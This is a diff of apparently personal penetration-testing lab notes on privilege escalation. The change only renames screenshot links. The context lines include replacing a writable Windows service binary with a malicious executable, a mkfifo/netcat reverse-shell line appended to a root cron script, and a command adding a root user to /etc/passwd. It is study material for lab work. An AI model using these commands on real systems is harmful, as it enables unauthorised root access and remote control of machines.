@@ -325,11 +325,11 @@ Adjusting this command from "calc.exe" to "cmd.exe" will spawn a cmd.exe shell w
 
 If a service is running as system and the permissions are misconfigured we may be able to replace the program, allowing us to escalate our privileges. To start, lets enumerate the current running services with the following powershell command:
 `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
-![[Pasted image 20220726104103.png]]
+![[serviio_path.png]]
 
 We see that Serviio is running from the Program Files directory which means this is a user-installed service. The next step is to investigate the permissions set on the service. We can do this with icacls.
 
-![[Pasted image 20220726104324.png]]
+![[icals.png]]
 We can see that the service allows members of the `BUILTIN\Users` group full access, a serious vulnerability. Lets leverage this to elevate our permissions. We start by compiling a malicious binary written in C that will add a user to the administrators group.
 
 code:
@@ -356,7 +356,7 @@ move malicious program into Serviio directory and rename:
 `move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"``
 
 As we do not have permissions to restart the service we can force a restart by simply rebooting the machine. After logging back in we can check the Administrators group and see our new user.
-![[Pasted image 20220726110517.png]]
+![[user_success.png]]
 
 
 
@@ -380,7 +380,7 @@ int main ()
 
 Once compiled into an exe we then follow the same steps as above, transferring the file to our windows machine, replacing the original "ServiioService.exe" binary, and restarting the system to restart the service. Before we reboot the machine we start a listener which, upon next login, will receive a reverse connection.
 
-![[Pasted image 20220726111659.png]]
+![[revshell.png]]
 
 
 # 18.3.3 Insecure File Permissions - Cron Case Study
@@ -388,14 +388,14 @@ Once compiled into an exe we then follow the same steps as above, transferring t
 
 To start, let's take a look at cron jobs running in the cron.log file. We can do this by grepping "CRON" from the log.
 `grep "CRON" /var/log/cron.log`
-![[Pasted image 20220726164159.png]]
+![[cron_log.png]]
 We can see a script labeled "user_backups.sh" is being run as root. Taking a look at the permissions of the file reveal that we have write access. 
-![[Pasted image 20220726164327.png]]
+![[script_permissions.png]]
 We can simply edit this script, appending a reverse shell. As the script is being run as root this reverse shell will also be run as root. We can append this script with the "mkfifo" command, essentially creating a named pipe which contains the commands for our reverse shell.
 `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh`
 
 Now we just need to wait for the job to run (every 5 minutes) and we will receive our reverse connection.
-![[Pasted image 20220726165546.png]]
+![[revshell2.png]]
 
 # 18.3.5 Insecure File Permissions: /etc/passwd Case Study
 **1. Log in to your Debian client with your student credentials and attempt to elevate your privileges by adding a superuser account to the /etc/passwd file.**
@@ -408,5 +408,5 @@ Then we append our new user with our generated password to the /etc/passwd file.
 `echo "dials:HMT7fWPZwTQ2Q:0:0:root:/root:/bin/bash" >> /etc/passwd`
 
 We can then switch to our new user via the `su` command and we should be root.
-![[Pasted image 20220726170059.png]]
+![[change_user.png]]
 
